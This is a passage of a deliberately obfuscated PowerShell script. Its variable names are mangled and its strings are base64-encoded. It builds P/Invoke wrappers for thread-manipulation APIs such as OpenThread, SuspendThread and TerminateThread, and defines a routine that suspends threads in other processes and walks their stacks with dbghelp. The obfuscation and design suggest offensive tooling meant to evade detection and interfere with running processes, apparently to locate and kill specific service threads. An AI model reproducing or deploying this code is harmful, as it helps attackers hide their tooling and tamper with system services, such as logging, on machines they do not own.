                [String]${__/====\/\__/\/==\},
                [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
                [Type]${______/=\_/\/\/\/\},
                [Parameter(ValueFromPipelineByPropertyName = $true)]
                [Type[]]${__/\_/\/=\__/=\/\_},
                [Parameter(ValueFromPipelineByPropertyName = $true)]
                [Runtime.InteropServices.CallingConvention]${__/\___/\___/\/\/=} = [Runtime.InteropServices.CallingConvention]::StdCall,
                [Parameter(ValueFromPipelineByPropertyName = $true)]
                [Runtime.InteropServices.CharSet]${_______/==\/\__/\_} = [Runtime.InteropServices.CharSet]::Auto,
                [Parameter(ValueFromPipelineByPropertyName = $true)]
                [Switch]${___/=\/==\/\/=\_/=},
                [Parameter(Mandatory = $true)]
                [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]${_/==\__/=\/\/===\_},
                [ValidateNotNull()]
                [String]${_/=\_/==\/=\/=\/==} = ''
            )
            BEGIN { ${/==\__/\__/\_/\_/} = @{} }
            PROCESS {
                if (${_/==\__/=\/\/===\_} -is [Reflection.Assembly])
                {
                    if (${_/=\_/==\/=\/=\/==})
                    {
                        ${/==\__/\__/\_/\_/}[${___/====\___/=====}] = ${_/==\__/=\/\/===\_}.GetType($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AFwAXwAvAD0APQBcAC8APQBcAC8APQBcAC8APQA9AH0ALgAkAHsAXwBfAF8ALwA9AD0APQA9AFwAXwBfAF8ALwA9AD0APQA9AD0AfQA='))))
                    }
                    else
                    {
                        ${/==\__/\__/\_/\_/}[${___/====\___/=====}] = ${_/==\__/=\/\/===\_}.GetType(${___/====\___/=====})
                    }
                }
                else 
                {
                    if (!${/==\__/\__/\_/\_/}.ContainsKey(${___/====\___/=====}))
                    {
                        if (${_/=\_/==\/=\/=\/==})
                        {
                            ${/==\__/\__/\_/\_/}[${___/====\___/=====}] = ${_/==\__/=\/\/===\_}.DefineType($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AFwAXwAvAD0APQBcAC8APQBcAC8APQBcAC8APQA9AH0ALgAkAHsAXwBfAF8ALwA9AD0APQA9AFwAXwBfAF8ALwA9AD0APQA9AD0AfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
                        }
                        else
                        {
                            ${/==\__/\__/\_/\_/}[${___/====\___/=====}] = ${_/==\__/=\/\/===\_}.DefineType(${___/====\___/=====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
                        }
                    }
                    ${/=====\____/\/==\} = ${/==\__/\__/\_/\_/}[${___/====\___/=====}].DefineMethod(${__/====\/\__/\/==\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAsAFAAaQBuAHYAbwBrAGUASQBtAHAAbAA='))), ${______/=\_/\/\/\/\}, ${__/\_/\/=\__/=\/\_})
                    ${_/\/=\___/===\_/\} = 1
                    foreach(${/=\/\___/=\_/=\/=} in ${__/\_/\/=\__/=\/\_})
                    {
                        if (${/=\/\___/=\_/=\/=}.IsByRef)
                        {
                            [void]${/=====\____/\/==\}.DefineParameter(${_/\/=\___/===\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQA'))), $null)
                        }
                        ${_/\/=\___/===\_/\}++
                    }
                    ${_/==\__/\___/\/\_} = [Runtime.InteropServices.DllImportAttribute]
                    ${_/\/=====\/\__/\_} = ${_/==\__/\___/\/\_}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA'))))
                    ${_/\__/=\____/=\_/} = ${_/==\__/\___/\/\_}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA=='))))
                    ${_/\/=\_/\/\_/\/==} = ${_/==\__/\___/\/\_}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBTAGUAdAA='))))
                    if (${___/=\/==\/\/=\_/=})
                    {
                        ${____/\/\/=\__/\/=} = $true
                    }
                    else
                    {
                        ${____/\/\/=\__/\/=} = $false
                    }
                    ${_/=\/==\/==\/\__/} = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
                    ${_/\/==\_/\/==\___} = New-Object -TypeName Reflection.Emit.CustomAttributeBuilder -ArgumentList (${_/=\/==\/==\/\__/}, ${___/====\___/=====}, [Reflection.PropertyInfo[]] @(), [Object[]] @(), [Reflection.FieldInfo[]] @(${_/\/=====\/\__/\_}, ${_/\__/=\____/=\_/}, ${_/\/=\_/\/\_/\/==}), [Object[]] @(${____/\/\/=\__/\/=}, ([Runtime.InteropServices.CallingConvention] ${__/\___/\___/\/\/=}), ([Runtime.InteropServices.CharSet] ${_______/==\/\__/\_})))
                    ${/=====\____/\/==\}.SetCustomAttribute(${_/\/==\_/\/==\___})
                }
            }
            END {
                if (${_/==\__/=\/\/===\_} -is [Reflection.Assembly])
                {
                    return ${/==\__/\__/\_/\_/}
                }
                ${__/\_/\/====\/==\} = @{}
                foreach (${____/\__/=\___/=\} in ${/==\__/\__/\_/\_/}.Keys)
                {
                    ${/===\_/\____/=\/\} = ${/==\__/\__/\_/\_/}[${____/\__/=\___/=\}].CreateType()
                    ${__/\_/\/====\/==\}[${____/\__/=\___/=\}] = ${/===\_/\____/=\/\}
                }
                return ${__/\_/\/====\/==\}
            }
        }
        function local:Get-DelegateType {
            Param (
                [OutputType([Type])]
                [Parameter( Position = 0)]
                [Type[]]${___/=\___/====\/\/} = (New-Object -TypeName Type[] -ArgumentList (0)),
                [Parameter( Position = 1 )]
                [Type]${______/=\_/\/\/\/\} = [Void]
            )
            ${__/\___/=\_/\_/=\} = [AppDomain]::CurrentDomain
            ${/=\/=\/==\/======} = New-Object -TypeName System.Reflection.AssemblyName -ArgumentList ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))
            ${/===\_/\/\/\__/==} = ${__/\___/=\_/\_/=\}.DefineDynamicAssembly(${/=\/=\/==\/======}, [Reflection.Emit.AssemblyBuilderAccess]::Run)
            ${_/\/\/=\/\/\___/=} = ${/===\_/\/\/\__/==}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
            ${__/\_/\___/\_____} = ${_/\/\/=\/\/\___/=}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [MulticastDelegate])
            ${/=\___/\_/\/=\_/=} = ${__/\_/\___/\_____}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [Reflection.CallingConventions]::Standard, ${___/=\___/====\/\/})
            ${/=\___/\_/\/=\_/=}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
            ${_/=\__/=\_/=====\} = ${__/\_/\___/\_____}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), ${______/=\_/\/\/\/\}, ${___/=\___/====\/\/})
            ${_/=\__/=\_/=====\}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
            ${__/\_/\___/\_____}.CreateType()
        }
        ${__/=====\/\___/\/} = @(
            (___/\/\___/=\_____ kernel32 OpenProcess ([IntPtr]) @([Int32], [Bool], [Int32]) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ kernel32 OpenThread ([IntPtr]) @([Int32], [Bool], [Int32]) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ kernel32 TerminateThread ([IntPtr]) @([Int32], [Int32]) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ kernel32 CloseHandle ([Bool]) @([IntPtr]) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ kernel32 Wow64SuspendThread ([UInt32]) @([IntPtr]) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ kernel32 SuspendThread ([UInt32]) @([IntPtr]) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ kernel32 ResumeThread ([UInt32]) @([IntPtr]) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ kernel32 Wow64GetThreadContext ([Bool]) @([IntPtr], [IntPtr]) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ kernel32 GetThreadContext ([Bool]) @([IntPtr], [IntPtr]) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ kernel32 GetSystemInfo ([Void]) @(${/===\__/=\_/\/\__}.MakeByRefType()) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ kernel32 IsWow64Process ([Bool]) @([IntPtr], [Bool].MakeByRefType()) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ psapi EnumProcessModulesEx ([Bool]) @([IntPtr], [IntPtr].MakeArrayType(), [UInt32], [UInt32].MakeByRefType(), [Int32]) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ psapi GetModuleInformation ([Bool]) @([IntPtr], [IntPtr], ${/===\/\_/==\/\_/=}.MakeByRefType(), [UInt32]) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ psapi GetModuleBaseNameW ([UInt32]) @([IntPtr], [IntPtr], [Text.StringBuilder], [Int32]) -_______/==\/\__/\_ Unicode -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ psapi GetModuleFileNameExW ([UInt32]) @([IntPtr], [IntPtr], [Text.StringBuilder], [Int32]) -_______/==\/\__/\_ Unicode -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ psapi GetMappedFileNameW ([UInt32]) @([IntPtr], [IntPtr], [Text.StringBuilder], [Int32]) -_______/==\/\__/\_ Unicode -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ dbghelp SymInitialize ([Bool]) @([IntPtr], [String], [Bool]) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ dbghelp SymCleanup ([Bool]) @([IntPtr]) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ dbghelp SymFunctionTableAccess64 ([IntPtr]) @([IntPtr], [UInt64]) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ dbghelp SymGetModuleBase64 ([UInt64]) @([IntPtr], [UInt64]) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ dbghelp SymGetSymFromAddr64 ([Bool]) @([IntPtr], [UInt64], [UInt64], [IntPtr]) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ dbghelp SymLoadModuleEx ([UInt64]) @([IntPtr], [IntPtr], [String], [String], [IntPtr], [Int32], [IntPtr], [Int32]) -___/=\/==\/\/=\_/=),
            (___/\/\___/=\_____ dbghelp StackWalk64 ([Bool]) @([UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [MulticastDelegate], [MulticastDelegate], [MulticastDelegate], [MulticastDelegate]))
        )
        ${/====\_/=\/==\/\_} = ${__/=====\/\___/\/} | ____/====\/===\__/ -_/==\__/=\/\/===\_ ${_/\/\/=\/\/\___/=} -_/=\_/==\/=\/=\/== $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAA==')))
        ${Global:_/\_/\/=\/\_/==\/} = ${/====\_/=\/==\/\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAA==')))]
        ${Global:/=====\/=\/====\/} = ${/====\_/=\/==\/\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABzAGEAcABpAA==')))]
        ${Global:/=\_/=\____/\_/\/} = ${/====\_/=\/==\/\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABiAGcAaABlAGwAcAA=')))]
        function local:Trace-Thread {
            Param (
                [Parameter()]
                [IntPtr]${____/===\/=\_/\/\_},
                [Parameter()]
                [Int]${__/==\_/=\/=\___/=},
                [Parameter()]
                [Int]${__/\______/\/\/=\/}
            )
            if ((${__/\/\/=\/====\/\} = ${_/\_/\/=\/\_/==\/}::OpenThread(0x1F03FF, $false, ${__/==\_/=\/=\___/=})) -eq 0) {
                Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABvAHAAZQBuACAAaABhAG4AZABsAGUAIABmAG8AcgAgAHQAaAByAGUAYQBkACAAJAB7AF8AXwAvAD0APQBcAF8ALwA9AFwALwA9AFwAXwBfAF8ALwA9AH0ALgA=')))
                return
            }
            function local:Get-SystemInfo {
                ${/====\_/=\/===\/\} = [Activator]::CreateInstance(${/===\__/=\_/\/\__})
                [void]${_/\_/\/=\/\_/==\/}::GetSystemInfo([ref]${/====\_/=\/===\/\})
                echo -InputObject ${/====\_/=\/===\/\}
            }
            function local:Import-ModuleSymbols {
                Param (
                    [Parameter(Mandatory = $true)]
                    [IntPtr]${____/===\/=\_/\/\_}
                )
                ${_/=\/=\/\/=\__/==} = 0
                if (!${/=====\/=\/====\/}::EnumProcessModulesEx(${____/===\/=\_/\/\_}, $null, 0, [ref]${_/=\/=\/\/=\__/==}, 3)) {
                    Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABnAGUAdAAgAGIAdQBmAGYAZQByACAAcwBpAHoAZQAgAGYAbwByACAAbQBvAGQAdQBsAGUAIABoAGEAbgBkAGwAZQBzAC4A')))
                    return
                }
                ${/=====\_/=\/==\_/} = ${_/=\/=\/\/=\__/==} / [IntPtr]::Size
                ${/=\/=\/\/=\/\__/\} = New-Object -TypeName IntPtr[] -ArgumentList ${/=====\_/=\/==\_/}
                ${/==\___/=\/=====\} = ${_/=\/=\/\/=\__/==}
                if (!${/=====\/=\/====\/}::EnumProcessModulesEx(${____/===\/=\_/\/\_}, ${/=\/=\/\/=\/\__/\}, ${/==\___/=\/=====\}, [ref]${_/=\/=\/\/=\__/==}, 3)) {
                    Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABnAGUAdAAgAG0AbwBkAHUAbABlACAAaABhAG4AZABsAGUAcwAgAGYAbwByACAAcAByAG8AYwBlAHMAcwAuAA==')))
                    return
                }
                for (${_/\/=\___/===\_/\} = 0; ${_/\/=\___/===\_/\} -lt ${/=====\_/=\/==\_/}; ${_/\/=\___/===\_/\}++)
                {
                    ${/=\/\____/=\_/\/\} = [Activator]::CreateInstance(${/===\/\_/==\/\_/=})
                    ${/===\/===\___/===} = New-Object Text.StringBuilder(256)
                    ${________/==\__/\/} = New-Object Text.StringBuilder(32)
                    if (!${/=====\/=\/====\/}::GetModuleFileNameExW(${____/===\/=\_/\/\_}, ${/=\/=\/\/=\/\__/\}[${_/\/=\___/===\_/\}], ${/===\/===\___/===}, ${/===\/===\___/===}.Capacity)) {
                        Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABnAGUAdAAgAG0AbwBkAHUAbABlACAAZgBpAGwAZQAgAG4AYQBtAGUALgA=')))
                        continue
                    }
                    if (!${/=====\/=\/====\/}::GetModuleBaseNameW(${____/===\/=\_/\/\_}, ${/=\/=\/\/=\/\__/\}[${_/\/=\___/===\_/\}], ${________/==\__/\/}, ${________/==\__/\/}.Capacity)) {
                        Write-Error "Failed to get module base name for $(${/===\/===\___/===}.ToString())."
                        continue
                    }
                    if (!${/=====\/=\/====\/}::GetModuleInformation(${____/===\/=\_/\/\_}, ${/=\/=\/\/=\/\__/\}[${_/\/=\___/===\_/\}], [ref]${/=\/\____/=\_/\/\},  [Runtime.InteropServices.Marshal]::SizeOf(${/=\/\____/=\_/\/\}))) {
                        Write-Error "Failed to get module information for module $(${________/==\__/\/}.ToString())."
                        continue
                    }
                    [void]${/=\_/=\____/\_/\/}::SymLoadModuleEx(${____/===\/=\_/\/\_}, [IntPtr]::Zero, ${/===\/===\___/===}.ToString(), ${________/==\__/\/}.ToString(), ${/=\/\____/=\_/\/\}.lpBaseOfDll, [Int32]${/=\/\____/=\_/\/\}.SizeOfImage, [IntPtr]::Zero, 0)
                }
                rv hModules
            }
            function local:Convert-UIntToInt {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [UInt64]${_/\____/=\______/=}
                )
                [Byte[]]${/===\_/===\__/\__} = [BitConverter]::GetBytes(${_/\____/=\______/=})
                return ([BitConverter]::ToInt64(${/===\_/===\__/\__}, 0))
            }
            function local:Initialize-Stackframe {
                Param (
                    [Parameter(Mandatory = $true)]
                    ${__/\/\/=\_/\___/==},
                    [Parameter(Mandatory = $true)]
                    ${____/\/\___/\__/=\},
                    [Parameter(Mandatory = $true)]
                    ${____/\/\/\/\/====\},
                    [Parameter()]
                    ${____/=\___/==\__/=}
                )
                ${/==\_____/\_/\_/\} = [Activator]::CreateInstance(${_/=\/\/=\__/\/=\/})
                ${____/=\/\/=\/\/==} = [Activator]::CreateInstance(${____/==\/====\_/\})
                ${____/=\/\/=\/\/==}.Mode = 0x03 
                ${____/=\/\/=\/\/==}.Offset = ${__/\/\/=\_/\___/==}
                ${/==\_____/\_/\_/\}.AddrPC = ${____/=\/\/=\/\/==}
                ${____/=\/\/=\/\/==}.Offset = ${____/\/\___/\__/=\}
                ${/==\_____/\_/\_/\}.AddrFrame = ${____/=\/\/=\/\/==}
                ${____/=\/\/=\/\/==}.Offset = ${____/\/\/\/\/====\}
                ${/==\_____/\_/\_/\}.AddrStack = ${____/=\/\/=\/\/==}
                ${____/=\/\/=\/\/==}.Offset = ${____/=\___/==\__/=}
                ${/==\_____/\_/\_/\}.AddrBStore = ${____/=\/\/=\/\/==}
                echo -InputObject ${/==\_____/\_/\_/\}
            }
            function local:Get-SymbolFromAddress {
                Param (
                    [Parameter(Mandatory = $true)]
                    [IntPtr]${____/===\/=\_/\/\_},
                    [Parameter(Mandatory = $true)]
                    ${___/===\/=\____/\/}
                )
                ${_/=\_/=====\/\/\_} = [Activator]::CreateInstance(${_/\_/\/=\__/\/\__})
                ${_/=\_/=====\/\/\_}.SizeOfStruct = [Runtime.InteropServices.Marshal]::SizeOf(${_/=\_/=====\/\/\_})
                ${_/=\_/=====\/\/\_}.MaxNameLength = 32
                ${___/\/====\/\/\/=} = [Runtime.InteropServices.Marshal]::AllocHGlobal(${_/=\_/=====\/\/\_}.SizeOfStruct)
                [Runtime.InteropServices.Marshal]::StructureToPtr(${_/=\_/=====\/\/\_}, ${___/\/====\/\/\/=}, $false)
                [void]${/=\_/=\____/\_/\/}::SymGetSymFromAddr64(${____/===\/=\_/\/\_}, ${___/===\/=\____/\/}, 0, ${___/\/====\/\/\/=})
                ${_/=\_/=====\/\/\_} = [Runtime.InteropServices.Marshal]::PtrToStructure(${___/\/====\/\/\/=}, [Type]${_/\_/\/=\__/\/\__})
                [Runtime.InteropServices.Marshal]::FreeHGlobal(${___/\/====\/\/\/=})
                echo -InputObject ${_/=\_/=====\/\/\_}
            }
            ${/=\/==\_/\/\_/=\/} = __/=\_/\_/=\/\/\/= @([IntPtr], [UInt64]) ([IntPtr])
            ${__/\___/==\___/=\} = {
                Param([IntPtr]${____/===\/=\_/\/\_}, [UInt64]$AddrBase) ${/=\_/=\____/\_/\/}::SymFunctionTableAccess64(${____/===\/=\_/\/\_}, $AddrBase)
            }
            ${/===\/==\_/=\/\/=} = ${__/\___/==\___/=\} -as ${/=\/==\_/\/\_/=\/}
            ${___/=\/=\/=\/==\_} = __/=\_/\_/=\/\/\/= @([IntPtr], [UInt64]) ([UInt64])
            ${__/\___/==\___/=\} = {
                Param([IntPtr]${____/===\/=\_/\/\_}, [UInt64]${___/===\/=\____/\/}) ${/=\_/=\____/\_/\/}::SymGetModuleBase64(${____/===\/=\_/\/\_}, ${___/===\/=\____/\/})
            }
            ${/==\/\____/\/\___} = ${__/\___/==\___/=\} -as ${___/=\/=\/=\/==\_}
            ${_/\__/\__/=\__/\/} = [IntPtr]::Zero
            ${/==\_____/\_/\_/\} = [Activator]::CreateInstance(${_/=\/\/=\__/\/=\/})
            ${/==\__/=\__/\/=\_} = 0
            ${/=\_/====\_/\_/\_} = $false
            ${/====\_/=\/===\/\} = _/==\/=\_/\/\/====
            if (${/====\_/=\/===\/\}.ProcessorArchitecture -ne 0) {
                if (!${_/\_/\/=\/\_/==\/}::IsWow64Process(${____/===\/=\_/\/\_}, [ref]${/=\_/====\_/\_/\_})) { Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFcAbwB3ADYANABQAHIAbwBjAGUAcwBzACAAZgBhAGkAbAB1AHIAZQAuAA=='))) }
            }
            if (${/=\_/====\_/\_/\_})
            {
                ${/==\__/=\__/\/=\_} = 0x014C 
                __/\_/\/=\__/\__/\ -____/===\/=\_/\/\_ ${____/===\/=\_/\/\_}
                ${___/\/=====\___/=} = [Activator]::CreateInstance(${_/\_/\___/\/=\___})
                ${___/\/=====\___/=}.ContextFlags = 0x1003F 
                ${_/\__/\__/=\__/\/} = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf(${___/\/=====\___/=}))
                [Runtime.InteropServices.Marshal]::StructureToPtr(${___/\/=====\___/=}, ${_/\__/\__/=\__/\/}, $false)
                if (${_/\_/\/=\/\_/==\/}::Wow64SuspendThread(${__/\/\/=\/====\/\}) -eq -1) { Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABzAHUAcwBwAGUAbgBkACAAdABoAHIAZQBhAGQAIAAkAHsAXwBfAC8APQA9AFwAXwAvAD0AXAAvAD0AXABfAF8AXwAvAD0AfQAuAA=='))) }
                if (!${_/\_/\/=\/\_/==\/}::Wow64GetThreadContext(${__/\/\/=\/====\/\}, ${_/\__/\__/=\__/\/})) { Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AZgAgAGcAZQB0ACAAYwBvAG4AdABlAHgAdAAgAG8AZgAgAHQAaAByAGUAYQBkACAAJAB7AF8AXwAvAD0APQBcAF8ALwA9AFwALwA9AFwAXwBfAF8ALwA9AH0ALgA='))) }
                ${___/\/=====\___/=} = [Runtime.InteropServices.Marshal]::PtrToStructure(${_/\__/\__/=\__/\/}, [Type]${_/\_/\___/\/=\___})
                ${/==\_____/\_/\_/\} = __/\/\__/==\/=\___ ${___/\/=====\___/=}.Eip ${___/\/=====\___/=}.Esp ${___/\/=====\___/=}.Ebp $null
            }
            elseif (${/====\_/=\/===\/\}.ProcessorArchitecture -eq 0)
            {
                ${/==\__/=\__/\/=\_} = 0x014C 
                __/\_/\/=\__/\__/\ -____/===\/=\_/\/\_ ${____/===\/=\_/\/\_}
                ${___/\/=====\___/=} = [Activator]::CreateInstance(${_/\_/\___/\/=\___})
                ${___/\/=====\___/=}.ContextFlags = 0x1003F 
                ${_/\__/\__/=\__/\/} = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf(${___/\/=====\___/=}))
                [Runtime.InteropServices.Marshal]::StructureToPtr(${___/\/=====\___/=}, ${_/\__/\__/=\__/\/}, $false)
                if (${_/\_/\/=\/\_/==\/}::SuspendThread(${__/\/\/=\/====\/\}) -eq -1) { Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABzAHUAcwBwAGUAbgBkACAAdABoAHIAZQBhAGQAIAAkAHsAXwBfAC8APQA9AFwAXwAvAD0AXAAvAD0AXABfAF8AXwAvAD0AfQAuAA=='))) }
                if (!${_/\_/\/=\/\_/==\/}::GetThreadContext(${__/\/\/=\/====\/\}, ${_/\__/\__/=\__/\/})) { Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AZgAgAGcAZQB0ACAAYwBvAG4AdABlAHgAdAAgAG8AZgAgAHQAaAByAGUAYQBkACAAJAB7AF8AXwAvAD0APQBcAF8ALwA9AFwALwA9AFwAXwBfAF8ALwA9AH0ALgA='))) }
                ${___/\/=====\___/=} = [Runtime.InteropServices.Marshal]::PtrToStructure(${_/\__/\__/=\__/\/}, [Type]${_/\_/\___/\/=\___})
                ${/==\_____/\_/\_/\} = __/\/\__/==\/=\___ ${___/\/=====\___/=}.Eip ${___/\/=====\___/=}.Esp ${___/\/=====\___/=}.Ebp $null
            }
            elseif (${/====\_/=\/===\/\}.ProcessorArchitecture -eq 9)
            {
                ${/==\__/=\__/\/=\_} = 0x8664 
                __/\_/\/=\__/\__/\ -____/===\/=\_/\/\_ ${____/===\/=\_/\/\_}
                ${___/\/=====\___/=} = [Activator]::CreateInstance(${_/\/\/\/\/\_/=\__})
                ${___/\/=====\___/=}.ContextFlags = 0x10003B 
                ${_/\__/\__/=\__/\/} = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf(${___/\/=====\___/=}))
                [Runtime.InteropServices.Marshal]::StructureToPtr(${___/\/=====\___/=}, ${_/\__/\__/=\__/\/}, $false)
                if (${_/\_/\/=\/\_/==\/}::SuspendThread(${__/\/\/=\/====\/\}) -eq -1) { Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABzAHUAcwBwAGUAbgBkACAAdABoAHIAZQBhAGQAIAAkAHsAXwBfAC8APQA9AFwAXwAvAD0AXAAvAD0AXABfAF8AXwAvAD0AfQAuAA=='))) }
                if (!${_/\_/\/=\/\_/==\/}::GetThreadContext(${__/\/\/=\/====\/\}, ${_/\__/\__/=\__/\/})) { Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AZgAgAGcAZQB0ACAAYwBvAG4AdABlAHgAdAAgAG8AZgAgAHQAaAByAGUAYQBkACAAJAB7AF8AXwAvAD0APQBcAF8ALwA9AFwALwA9AFwAXwBfAF8ALwA9AH0ALgA='))) }
                ${___/\/=====\___/=} = [Runtime.InteropServices.Marshal]::PtrToStructure(${_/\__/\__/=\__/\/}, [Type]${_/\/\/\/\/\_/=\__})
                ${/==\_____/\_/\_/\} = __/\/\__/==\/=\___ ${___/\/=====\___/=}.Rip ${___/\/=====\___/=}.Rsp ${___/\/=====\___/=}.Rsp $null
            }
            elseif (${/====\_/=\/===\/\}.ProcessorArchitecture -eq 6)
            {
                ${/==\__/=\__/\/=\_} = 0x0200 
                __/\_/\/=\__/\__/\ -____/===\/=\_/\/\_ ${____/===\/=\_/\/\_}
                ${___/\/=====\___/=} = [Activator]::CreateInstance(${/==\/===\_/\/===\})
                ${___/\/=====\___/=}.ContextFlags = 0x8003D 
                ${_/\__/\__/=\__/\/} = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf(${___/\/=====\___/=}))
                [Runtime.InteropServices.Marshal]::StructureToPtr(${___/\/=====\___/=}, ${_/\__/\__/=\__/\/}, $false)
                if (${_/\_/\/=\/\_/==\/}::SuspendThread(${__/\/\/=\/====\/\}) -eq -1) { Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABzAHUAcwBwAGUAbgBkACAAdABoAHIAZQBhAGQAIAAkAHsAXwBfAC8APQA9AFwAXwAvAD0AXAAvAD0AXABfAF8AXwAvAD0AfQAuAA=='))) }
